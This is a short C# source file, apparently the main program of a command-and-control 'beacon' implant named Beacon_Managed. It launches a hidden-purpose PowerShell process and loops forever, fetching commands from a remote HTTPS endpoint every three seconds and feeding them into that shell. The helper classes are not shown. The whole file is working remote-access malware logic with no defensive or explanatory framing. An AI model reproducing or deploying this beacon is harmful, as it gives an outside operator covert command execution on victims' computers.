using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Beacon_Managed
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(int dwMilliseconds);

        static void Main(string[] args)
        {
            ProcessHelper.create_powershell_process();

            HttpsCommunicator communicator = new HttpsCommunicator();

            string output;
            string cmd;

            for (; ; )
            {
                Sleep(3000);

                cmd = communicator.GetCommand();
                if (cmd != "")
                {
                    Console.WriteLine(cmd);
                    ProcessHelper.write_input(cmd);
                }

                output = ProcessHelper.read_output();
                if(output!="")
                    Console.WriteLine(output);
            }
        }
    }
}
